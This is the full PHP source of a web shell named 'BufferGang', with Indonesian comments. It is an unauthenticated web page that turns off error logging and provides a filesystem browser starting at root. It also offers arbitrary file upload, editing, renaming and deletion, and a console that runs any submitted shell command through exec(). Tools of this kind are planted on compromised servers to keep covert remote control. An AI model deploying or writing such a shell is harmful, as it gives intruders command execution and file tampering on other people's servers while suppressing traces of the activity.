<?php
// buffergang.php - BufferGang Webshell with GET Navigation
error_reporting(0);
ini_set('display_errors', 0);
ini_set('log_errors', 0);
session_start();

// Konfigurasi - Root selalu '/'
$root_path = '/';

// Get current path from URL parameter
if (isset($_GET['path'])) {
    $current_path = $_GET['path'];
    // Validasi path harus absolute
    if ($current_path[0] !== '/') {
        $current_path = '/' . $current_path;
    }
    // Validasi path exists dan is directory
    $real_path = realpath($current_path);
    if ($real_path && is_dir($real_path)) {
        $current_path = $real_path;
        $_SESSION['current_path'] = $current_path;
    } else {
        $current_path = isset($_SESSION['current_path']) ? $_SESSION['current_path'] : $root_path;
    }
} else {
    $current_path = isset($_SESSION['current_path']) ? $_SESSION['current_path'] : $root_path;
}

// Handle Create Folder
if (isset($_POST['create_folder']) && !empty($_POST['folder_name'])) {
    $folder_name = preg_replace('/[^a-zA-Z0-9_\-]/', '', $_POST['folder_name']);
    if (!empty($folder_name)) {
        $new_path = $current_path . '/' . $folder_name;
        if (!file_exists($new_path)) {
            @mkdir($new_path, 0755);
        }
    }
    header('Location: ?path=' . urlencode($current_path));
    exit;
}

// Handle Upload
if (isset($_POST['upload_file']) && isset($_FILES['file']) && $_FILES['file']['error'] == 0) {
    $target = $current_path . '/' . basename($_FILES['file']['name']);
    @move_uploaded_file($_FILES['file']['tmp_name'], $target);
    header('Location: ?path=' . urlencode($current_path));
    exit;
}

// Handle Delete
if (isset($_GET['delete'])) {
    $target = $current_path . '/' . $_GET['delete'];
    if (file_exists($target)) {
        if (is_file($target)) {
            @unlink($target);
        } elseif (is_dir($target)) {
            @rmdir($target);
        }
    }
    header('Location: ?path=' . urlencode($current_path));
    exit;
}

// Handle Rename
if (isset($_POST['rename_file']) && isset($_POST['old_name']) && isset($_POST['new_name'])) {
    $old = $current_path . '/' . $_POST['old_name'];
    $new = $current_path . '/' . $_POST['new_name'];
    if (file_exists($old) && !file_exists($new)) {
        @rename($old, $new);
    }
    header('Location: ?path=' . urlencode($current_path));
    exit;
}

// Handle Save Edit
if (isset($_POST['save_edit']) && isset($_POST['filename']) && isset($_POST['content'])) {
    $file = $current_path . '/' . $_POST['filename'];
    if (is_file($file) && is_writable($file)) {
        @file_put_contents($file, $_POST['content']);
    }
    header('Location: ?path=' . urlencode($current_path));
    exit;
}

// Handle Console Command
if (isset($_POST['run_command']) && isset($_POST['command'])) {
    $command = $_POST['command'];
    $output = [];
    $return_var = 0;
    @exec($command . ' 2>&1', $output, $return_var);
    $_SESSION['cmd'] = $command;
    $_SESSION['output'] = implode("\n", $output);
    $_SESSION['return'] = $return_var;
    header('Location: ?path=' . urlencode($current_path) . '&console=1');
    exit;
}

// Get directory contents
$folders = [];
$files = [];
if (is_dir($current_path)) {
    $items = @scandir($current_path);
    if ($items) {
        foreach ($items as $item) {
            if ($item == '.' || $item == '..') continue;
            $full_item = $current_path . '/' . $item;
            if (is_dir($full_item)) {
                $folders[] = $item;
            } else {
                $files[] = $item;
            }
        }
        sort($folders);
        sort($files);
    }
}

// Function format size
function format_size($bytes) {
    if ($bytes >= 1073741824) return number_format($bytes / 1073741824, 2) . ' GB';
    if ($bytes >= 1048576) return number_format($bytes / 1048576, 2) . ' MB';
    if ($bytes >= 1024) return number_format($bytes / 1024, 2) . ' KB';
    if ($bytes > 1) return $bytes . ' bytes';
    if ($bytes == 1) return '1 byte';
    return '0 bytes';
}
?>
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>BufferGang - Webshell</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'JetBrains Mono', monospace;
            background: #2e3440;
            padding: 20px;
            color: #d8dee9;
        }

        .container {
            max-width: 1400px;
            margin: 0 auto;
        }

        .header {
            background: #3b4252;
            border-radius: 8px 8px 0 0;
            padding: 20px;
            border-bottom: 2px solid #4c566a;
        }

        h1 {
            font-size: 28px;
            color: #88c0d0;
            margin-bottom: 10px;
        }

        h1 span {
            background: #5e81ac;
            color: #eceff4;
            padding: 2px 10px;
            border-radius: 20px;
            font-size: 14px;
            margin-left: 10px;
        }

        .current-path {
            background: #2e3440;
            padding: 10px;
            border-radius: 4px;
            font-family: 'JetBrains Mono', monospace;
            font-size: 13px;
            color: #88c0d0;
            margin: 15px 0;
            word-break: break-all;
            border: 1px solid #4c566a;
        }

        .nav-buttons {
            display: flex;
            gap: 10px;
            margin-bottom: 20px;
            flex-wrap: wrap;
            align-items: center;
        }

        .nav-btn {
            background: #434c5e;
            padding: 8px 15px;
            border-radius: 5px;
            text-decoration: none;
            color: #d8dee9;
            font-size: 14px;
            transition: all 0.2s;
            border: none;
            cursor: pointer;
            display: inline-block;
        }

        .nav-btn:hover {
            background: #4c566a;
            transform: translateY(-1px);
        }

        .actions {
            display: flex;
            gap: 10px;
            flex-wrap: wrap;
            margin-bottom: 20px;
            padding: 15px;
            background: #434c5e;
            border-radius: 5px;
        }

        .action-form {
            display: inline-flex;
            gap: 5px;
            align-items: center;
        }

        input, button {
            padding: 6px 12px;
            border: 1px solid #4c566a;
            border-radius: 4px;
            font-size: 13px;
            background: #3b4252;
            color: #d8dee9;
        }

        button {
            background: #5e81ac;
            color: white;
            border: none;
            cursor: pointer;
            transition: all 0.2s;
        }

        button:hover {
            background: #81a1c1;
            transform: translateY(-1px);
        }

        .main-layout {
            background: #3b4252;
            border-radius: 0 0 8px 8px;
            overflow: hidden;
        }

        .file-browser {
            background: #3b4252;
            overflow-x: auto;
        }

        table {
            width: 100%;
            border-collapse: collapse;
        }

        th, td {
            text-align: left;
            padding: 12px;
            border-bottom: 1px solid #4c566a;
        }

        th {
            background: #434c5e;
            font-weight: 600;
            color: #88c0d0;
        }

        tr:hover {
            background: #434c5e;
        }

        .folder-row {
            background: #2e3440;
        }

        .parent-row {
            background: #434c5e;
            font-weight: bold;
        }

        .folder-link {
            text-decoration: none;
            color: #88c0d0;
            font-weight: 500;
        }

        .folder-link:hover {
            color: #8fbcbb;
            text-decoration: underline;
        }

        .action-buttons {
            display: flex;
            gap: 5px;
            flex-wrap: wrap;
        }

        .btn-small {
            padding: 3px 8px;
            font-size: 11px;
            text-decoration: none;
            border-radius: 3px;
            display: inline-block;
            border: none;
            cursor: pointer;
        }

        .btn-edit {
            background: #a3be8c;
            color: #2e3440;
        }

        .btn-delete {
            background: #bf616a;
            color: white;
        }

        .btn-download {
            background: #81a1c1;
            color: #2e3440;
        }

        .btn-rename {
            background: #ebcb8b;
            color: #2e3440;
        }

        .page-container {
            background: #3b4252;
            border-radius: 8px;
            padding: 30px;
            max-width: 900px;
            margin: 0 auto;
        }

        .page-container h2 {
            color: #88c0d0;
            margin-bottom: 20px;
            padding-bottom: 10px;
            border-bottom: 2px solid #4c566a;
        }

        .page-container input, 
        .page-container textarea {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            background: #2e3440;
            border: 1px solid #4c566a;
            color: #d8dee9;
            font-family: 'JetBrains Mono', monospace;
        }

        .page-container textarea {
            min-height: 500px;
            resize: vertical;
        }

        .page-container button {
            width: 100%;
            padding: 10px;
            margin-top: 10px;
        }

        .back-link {
            display: inline-block;
            margin-top: 15px;
            color: #88c0d0;
            text-decoration: none;
        }

        .back-link:hover {
            color: #8fbcbb;
            text-decoration: underline;
        }

        .console-output-box {
            background: #2e3440;
            padding: 15px;
            border-radius: 5px;
            margin: 15px 0;
            max-height: 500px;
            overflow-y: auto;
            font-family: 'JetBrains Mono', monospace;
            font-size: 13px;
        }

        .console-line {
            padding: 5px;
            border-bottom: 1px solid #4c566a;
        }

        .output-text {
            color: #a3be8c;
            white-space: pre-wrap;
        }

        .error-text {
            color: #bf616a;
        }

        .breadcrumb {
            display: flex;
            flex-wrap: wrap;
            gap: 5px;
            margin-top: 10px;
            padding: 8px;
            background: #2e3440;
            border-radius: 4px;
        }

        .breadcrumb a {
            background: #434c5e;
            padding: 4px 8px;
            border-radius: 3px;
            font-size: 11px;
            text-decoration: none;
            color: #d8dee9;
        }

        .breadcrumb a:hover {
            background: #4c566a;
        }

        .go-to-form {
            display: flex;
            gap: 5px;
            align-items: center;
            flex: 1;
        }

        .go-to-input {
            flex: 1;
            background: #2e3440;
            border: 1px solid #4c566a;
            color: #d8dee9;
            font-family: monospace;
        }

        /* ============================================ */
        /* RESPONSIVE CSS QUERIES - Mobile & Tablet */
        /* ============================================ */
        
        /* Tablet (max-width: 768px) */
        @media (max-width: 768px) {
            body {
                padding: 10px;
            }
            
            .header {
                padding: 15px;
            }
            
            h1 {
                font-size: 22px;
            }
            
            h1 span {
                font-size: 11px;
                margin-left: 5px;
            }
            
            .nav-buttons {
                flex-direction: column;
                align-items: stretch;
            }
            
            .nav-btn {
                text-align: center;
            }
            
            .go-to-form {
                margin-left: 0 !important;
                width: 100%;
                flex-direction: column;
            }
            
            .go-to-input {
                width: 100%;
            }
            
            .actions {
                flex-direction: column;
                padding: 12px;
            }
            
            .action-form {
                width: 100%;
                flex-direction: column;
            }
            
            .action-form input[type="file"],
            .action-form input[type="text"] {
                width: 100%;
            }
            
            .action-form button {
                width: 100%;
            }
            
            .file-browser {
                overflow-x: auto;
                -webkit-overflow-scrolling: touch;
            }
            
            table {
                min-width: 600px;
            }
            
            th, td {
                padding: 8px 10px;
                font-size: 12px;
            }
            
            .btn-small {
                padding: 4px 8px;
                font-size: 10px;
            }
            
            .action-buttons {
                gap: 4px;
            }
            
            .page-container {
                padding: 20px;
                margin: 0 10px;
            }
            
            .page-container textarea {
                min-height: 350px;
            }
            
            .breadcrumb {
                flex-wrap: wrap;
            }
            
            .breadcrumb a {
                font-size: 10px;
                padding: 3px 6px;
            }
        }
        
        /* Mobile Small (max-width: 480px) */
        @media (max-width: 480px) {
            body {
                padding: 5px;
            }
            
            .header {
                padding: 12px;
            }
            
            h1 {
                font-size: 18px;
                text-align: center;
            }
            
            h1 span {
                font-size: 9px;
                display: inline-block;
                margin-top: 4px;
            }
            
            .current-path {
                font-size: 11px;
                padding: 8px;
            }
            
            .breadcrumb {
                flex-direction: column;
                align-items: flex-start;
            }
            
            .breadcrumb span {
                display: none;
            }
            
            .breadcrumb a {
                display: inline-block;
                margin-bottom: 3px;
            }
            
            .nav-btn, .action-form button {
                font-size: 12px;
                padding: 8px 12px;
            }
            
            .actions {
                padding: 10px;
            }
            
            th, td {
                padding: 6px 8px;
                font-size: 11px;
            }
            
            .btn-small {
                font-size: 9px;
                padding: 3px 6px;
            }
            
            .page-container {
                padding: 15px;
            }
            
            .page-container h2 {
                font-size: 18px;
            }
            
            .page-container textarea {
                min-height: 250px;
                font-size: 12px;
            }
            
            .console-output-box {
                font-size: 11px;
                max-height: 350px;
            }
            
            .console-line pre {
                font-size: 10px;
                white-space: pre-wrap;
                word-break: break-all;
            }
            
            .back-link {
                font-size: 12px;
            }
        }
        
        /* Mobile Landscape (max-width: 768px and orientation: landscape) */
        @media (max-width: 768px) and (orientation: landscape) {
            .page-container textarea {
                min-height: 200px;
            }
            
            .console-output-box {
                max-height: 250px;
            }
        }
        
        /* Large Desktop (min-width: 1400px) */
        @media (min-width: 1400px) {
            .container {
                max-width: 1600px;
            }
            
            body {
                padding: 30px;
            }
            
            th, td {
                padding: 14px;
                font-size: 14px;
            }
            
            .btn-small {
                padding: 4px 10px;
                font-size: 12px;
            }
        }
        
        /* Print style (opsional) */
        @media print {
            .actions, .nav-buttons, .action-buttons, .go-to-form {
                display: none;
            }
            
            body {
                background: white;
                color: black;
                padding: 0;
            }
            
            .header, .main-layout, .file-browser {
                background: white;
                color: black;
            }
            
            table {
                border: 1px solid #ccc;
            }
            
            th, td {
                border: 1px solid #ccc;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>👑 BufferGang <span>Webshell</span></h1>
            <div class="current-path">
                📂 Current: <?php echo htmlspecialchars($current_path); ?>
                <div class="breadcrumb">
                    <a href="?path=/">🏠 /</a>
                    <?php 
                    $parts = explode('/', trim($current_path, '/'));
                    $build = '';
                    foreach ($parts as $part):
                        if (empty($part)) continue;
                        $build .= '/' . $part;
                    ?>
                        <span>›</span>
                        <a href="?path=<?php echo urlencode($build); ?>">📁 <?php echo htmlspecialchars($part); ?></a>
                    <?php endforeach; ?>
                </div>
            </div>
            
            <div class="nav-buttons">
                <!-- Up One Directory dengan GET -->
                <?php 
                $parent_path = dirname($current_path);
                if ($parent_path != $current_path):
                ?>
                <a href="?path=<?php echo urlencode($parent_path); ?>" class="nav-btn">⬆️ Up One Directory</a>
                <?php endif; ?>
                
                <a href="?path=/" class="nav-btn" style="background: #5e81ac;">🏠 Root (/)</a>
                
                <form method="GET" class="go-to-form" style="margin-left: auto;">
                    <input type="text" name="path" class="go-to-input" placeholder="Go to path (ex: /home, /var/log, /opt)" value="<?php echo htmlspecialchars($current_path); ?>" autocomplete="off">
                    <button type="submit">🔍 Go</button>
                </form>
            </div>
            
            <div class="actions">
                <form method="POST" class="action-form" enctype="multipart/form-data">
                    <input type="file" name="file" required>
                    <button type="submit" name="upload_file">📤 Upload</button>
                </form>
                
                <form method="POST" class="action-form">
                    <input type="text" name="folder_name" placeholder="Folder name" required>
                    <button type="submit" name="create_folder">📁 Create Folder</button>
                </form>
                
                <a href="?path=<?php echo urlencode($current_path); ?>&console=1" class="nav-btn" style="background: #5e81ac;">💻 Open Console</a>
            </div>
        </div>
        
        <?php if (isset($_GET['edit']) && isset($_GET['file'])): 
            $edit_file = $current_path . '/' . $_GET['file'];
            $file_content = '';
            $file_size = 0;
            if (is_file($edit_file) && is_readable($edit_file)) {
                $file_size = filesize($edit_file);
                if ($file_size <= 5242880) {
                    $file_content = @file_get_contents($edit_file);
                } else {
                    $file_content = "// File too large to edit (max 5MB)\n// File size: " . format_size($file_size);
                }
            }
        ?>
            <div class="page-container">
                <h2>✏️ Edit File: <?php echo htmlspecialchars($_GET['file']); ?></h2>
                <form method="POST">
                    <input type="hidden" name="filename" value="<?php echo htmlspecialchars($_GET['file']); ?>">
                    <textarea name="content"><?php echo htmlspecialchars($file_content); ?></textarea>
                    <button type="submit" name="save_edit">💾 Save Changes</button>
                </form>
                <a href="?path=<?php echo urlencode($current_path); ?>" class="back-link">← Back to Webshell</a>
            </div>
        <?php elseif (isset($_GET['rename']) && isset($_GET['file'])): ?>
            <div class="page-container">
                <h2>✏️ Rename: <?php echo htmlspecialchars($_GET['file']); ?></h2>
                <form method="POST">
                    <input type="hidden" name="old_name" value="<?php echo htmlspecialchars($_GET['file']); ?>">
                    <label>New Name:</label>
                    <input type="text" name="new_name" value="<?php echo htmlspecialchars($_GET['file']); ?>" required autofocus>
                    <button type="submit" name="rename_file">💾 Save Rename</button>
                </form>
                <a href="?path=<?php echo urlencode($current_path); ?>" class="back-link">← Back to Webshell</a>
            </div>
        <?php elseif (isset($_GET['console'])): ?>
            <div class="page-container">
                <h2>💻 System Console</h2>
                <div class="console-output-box">
                    <?php if (isset($_SESSION['output'])): ?>
                        <div class="console-line">
                            <span style="color: #88c0d0;">$ <?php echo htmlspecialchars($_SESSION['cmd']); ?></span>
                        </div>
                        <div class="console-line">
                            <pre class="output-text <?php echo $_SESSION['return'] !== 0 ? 'error-text' : ''; ?>"><?php echo htmlspecialchars($_SESSION['output']); ?></pre>
                        </div>
                        <div class="console-line">
                            <span style="color: #4c566a;">Exit code: <?php echo $_SESSION['return']; ?></span>
                        </div>
                    <?php else: ?>
                        <div class="console-line">
                            <span style="color: #4c566a;">No commands executed yet</span>
                        </div>
                    <?php endif; ?>
                </div>
                <form method="POST">
                    <input type="text" name="command" placeholder="Enter command (ls, pwd, whoami, df -h, cat file.txt)" autocomplete="off" style="width: 100%;">
                    <button type="submit" name="run_command">▶️ Execute</button>
                </form>
                <a href="?path=<?php echo urlencode($current_path); ?>" class="back-link">← Back to Webshell</a>
            </div>
        <?php else: ?>
            <div class="main-layout">
                <div class="file-browser">
                    <table>
                        <thead>
                            <tr>
                                <th>Name</th>
                                <th>Size</th>
                                <th>Modified</th>
                                <th>Actions</th>
                            </tr>
                        </thead>
                        <tbody>
                            <!-- Parent Directory dengan GET -->
                            <?php if ($current_path != '/'): 
                                $parent_path = dirname($current_path);
                            ?>
                            <tr class="parent-row">
                                <td>
                                    <a href="?path=<?php echo urlencode($parent_path); ?>" class="folder-link" style="color: #ebcb8b;">
                                        📂 .. (Parent Directory)
                                    </a>
                                </td>
                                <td>-</td>
                                <td>-</td>
                                <td>-</td>
                            </tr>
                            <?php endif; ?>
                            
                            <!-- Folders -->
                            <?php foreach ($folders as $folder): 
                                $full_path = $current_path . '/' . $folder;
                                $modified = date('Y-m-d H:i:s', @filemtime($full_path));
                            ?>
                            <tr class="folder-row">
                                <td>
                                    <a href="?path=<?php echo urlencode($full_path); ?>" class="folder-link">
                                        📁 <?php echo htmlspecialchars($folder); ?>
                                    </a>
                                </td>
                                <td>-</td>
                                <td><?php echo $modified; ?></td>
                                <td class="action-buttons">
                                    <a href="?path=<?php echo urlencode($current_path); ?>&rename=1&file=<?php echo urlencode($folder); ?>" class="btn-small btn-rename">✏️ Rename</a>
                                    <a href="?path=<?php echo urlencode($current_path); ?>&delete=<?php echo urlencode($folder); ?>" class="btn-small btn-delete" onclick="return confirm('Delete folder?')">🗑️ Delete</a>
                                </td>
                            </tr>
                            <?php endforeach; ?>
                            
                            <!-- Files -->
                            <?php foreach ($files as $file): 
                                $full_path = $current_path . '/' . $file;
                                $size = format_size(@filesize($full_path));
                                $modified = date('Y-m-d H:i:s', @filemtime($full_path));
                            ?>
                            <tr>
                                <td>📄 <?php echo htmlspecialchars($file); ?></td>
                                <td><?php echo $size; ?></td>
                                <td><?php echo $modified; ?></td>
                                <td class="action-buttons">
                                    <a href="?path=<?php echo urlencode($current_path); ?>&edit=1&file=<?php echo urlencode($file); ?>" class="btn-small btn-edit">✏️ Edit</a>
                                    <a href="?path=<?php echo urlencode($current_path); ?>&rename=1&file=<?php echo urlencode($file); ?>" class="btn-small btn-rename">✏️ Rename</a>
                                    <a href="?path=<?php echo urlencode($current_path); ?>&delete=<?php echo urlencode($file); ?>" class="btn-small btn-delete" onclick="return confirm('Delete file?')">🗑️ Delete</a>
                                </td>
                            </tr>
                            <?php endforeach; ?>
                            
                            <?php if (empty($folders) && empty($files)): ?>
                            <tr>
                                <td colspan="4" style="text-align: center; padding: 40px; color: #4c566a;">
                                    📂 Directory is empty
                                </td>
                            </tr>
                            <?php endif; ?>
                        </tbody>
                    </table>
                </div>
            </div>
        <?php endif; ?>
    </div>
</body>
</html>